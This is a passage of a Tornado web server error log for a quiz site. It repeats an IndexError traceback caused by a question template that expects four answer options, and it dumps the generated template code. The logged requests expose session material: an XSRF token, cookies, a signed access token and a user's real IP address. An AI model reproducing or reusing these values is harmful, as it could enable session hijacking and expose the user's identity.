  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 125.43ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059fb8d8e4c8548017fb427&answers=%5B0%5D&cursor=6&_xsrf=f0271f0340514537ba04afbeb75a2657', headers={'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Length': '92', 'Accept-Language': 'en-gb,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20100101 Firefox/15.0.1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'X-Real-Ip': '109.158.140.86', 'Cookie': '_xsrf=f0271f0340514537ba04afbeb75a2657; __utma=188782963.121495992.1348074336.1348074336.1348074336.1; __utmb=188782963.5.10.1348074336; __utmc=188782963; __utmz=188782963.1348074336.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); access_token="QUFBRzZsTmNzNkdjQkFMYkZ2ZTZhN05BdnJaQVhpWDl2UmFXbWUwVllnWU1tWFh1TjA2N3JNMnNrQ243VEpLUzUxdEVGcU5aQ3dsSkFpaHVONkxBdXByakZ5dWd6cU15WkEzNTF2OXVKUVpEWkQ=|1348074355|dcece250862eac2015e0366c688d9203f2df8be3"', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 80.01ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059fb8d8e4c8548017fb427&answers=%5B2%5D&cursor=9&_xsrf=f0271f0340514537ba04afbeb75a2657', headers={'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Length': '92', 'Accept-Language': 'en-gb,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20100101 Firefox/15.0.1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'X-Real-Ip': '109.158.140.86', 'Cookie': '_xsrf=f0271f0340514537ba04afbeb75a2657; __utma=188782963.121495992.1348074336.1348074336.1348074336.1; __utmb=188782963.5.10.1348074336; __utmc=188782963; __utmz=188782963.1348074336.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); access_token="QUFBRzZsTmNzNkdjQkFMYkZ2ZTZhN05BdnJaQVhpWDl2UmFXbWUwVllnWU1tWFh1TjA2N3JNMnNrQ243VEpLUzUxdEVGcU5aQ3dsSkFpaHVONkxBdXByakZ5dWd6cU15WkEzNTF2OXVKUVpEWkQ=|1348074355|dcece250862eac2015e0366c688d9203f2df8be3"', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 80.19ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
